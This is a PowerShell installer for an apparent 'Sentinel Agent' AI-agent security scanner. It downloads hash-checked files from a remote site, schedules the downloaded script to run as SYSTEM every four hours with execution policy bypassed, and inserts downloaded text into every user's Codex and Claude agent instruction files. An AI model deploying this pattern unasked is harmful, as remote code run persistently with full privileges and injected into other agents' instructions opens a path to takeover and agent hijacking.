$ErrorActionPreference = 'Stop'
$baseUrl = 'https://sentinel-agent-security.yjiod2022.chatgpt.site/downloads'
$installDir = Join-Path $env:ProgramData 'SentinelAgent'
$reportDir = Join-Path $installDir 'reports'
$previousDir = Join-Path $installDir 'previous'
$stageDir = Join-Path $installDir ('.stage-' + [Guid]::NewGuid().ToString('N'))
$expected = @{ 'sentinel-policy.json'='8445ffbaf792cd4c92702d4359e1a853b9c35fb80c8862c81a7c46f184469cb1'; 'sentinel-windows.ps1'='06ba277fc6d17df423b6f49135762a2527d1460621633eef47a5d64e23df566a'; 'sentinel-security-baseline.md'='0c0b6ac7e4bee2859f0d0e70b80a3865fd5fb4c68cf531fe555188a1b9e6d19c' }
New-Item -ItemType Directory -Force -Path $installDir,$reportDir,$previousDir,$stageDir | Out-Null
& icacls.exe $installDir /inheritance:r /grant:r '*S-1-5-18:(OI)(CI)F' '*S-1-5-32-544:(OI)(CI)F' /T /C | Out-Null
try {
  foreach ($name in $expected.Keys) { Invoke-WebRequest "$baseUrl/$name" -OutFile (Join-Path $stageDir $name) -UseBasicParsing }
  foreach ($name in $expected.Keys) { if ((Get-FileHash (Join-Path $stageDir $name) -Algorithm SHA256).Hash.ToLower() -ne $expected[$name]) { throw "Integrity verification failed: $name" } }
  $backupHashes=@{}
  foreach ($name in $expected.Keys) { $current=Join-Path $installDir $name; if(Test-Path $current){Copy-Item $current (Join-Path $previousDir $name) -Force; $backupHashes[$name]=(Get-FileHash $current -Algorithm SHA256).Hash.ToLower()} }
  if($backupHashes.Count -eq $expected.Count){$backupHashes|ConvertTo-Json|Set-Content (Join-Path $previousDir 'checksums.json') -Encoding UTF8}
  foreach ($name in $expected.Keys) { Move-Item (Join-Path $stageDir $name) (Join-Path $installDir $name) -Force }
} finally { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue }
$baseline = Get-Content (Join-Path $installDir 'sentinel-security-baseline.md') -Raw
$userBaselineStart='<!-- sentinel-managed-user-baseline:start -->';$userBaselineEnd='<!-- sentinel-managed-user-baseline:end -->'
$userBaselineBlock=$userBaselineStart+"`n"+$baseline.TrimEnd()+"`n"+$userBaselineEnd
Get-ChildItem 'C:\Users' -Directory | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | ForEach-Object {
  $targets=@()
  $codexDir=Join-Path $_.FullName '.codex';$claudeDir=Join-Path $_.FullName '.claude'
  if((Test-Path $codexDir) -and -not ((Get-Item $codexDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){$targets += Join-Path $_.FullName '.codex\AGENTS.md'}
  if(((Test-Path $claudeDir) -and -not ((Get-Item $claudeDir -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)) -or (Test-Path (Join-Path $_.FullName '.claude.json'))){$targets += Join-Path $_.FullName '.claude\CLAUDE.md'}
  foreach ($target in $targets) {
    New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
    if((Test-Path $target) -and ((Get-Item $target -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)){continue}
    $existing=if(Test-Path $target){Get-Content $target -Raw}else{''}
    $pattern=[regex]::Escape($userBaselineStart)+'.*?'+[regex]::Escape($userBaselineEnd)
    if($existing -match [regex]::Escape($userBaselineStart)){$updated=[regex]::Replace($existing,$pattern,[System.Text.RegularExpressions.MatchEvaluator]{param($match)$userBaselineBlock},[System.Text.RegularExpressions.RegexOptions]::Singleline)}
    else{$updated=$existing.TrimEnd()+$(if($existing.Trim()){"`n`n"}else{''})+$userBaselineBlock+"`n"}
    if($updated -ne $existing){Set-Content -Encoding UTF8 $target $updated}
  }
}
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$installDir\sentinel-windows.ps1`" -Output `"$reportDir\latest.json`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 4)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'Sentinel AI Agent Security Scan' -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Write-Output 'Sentinel Agent installed and scheduled.'
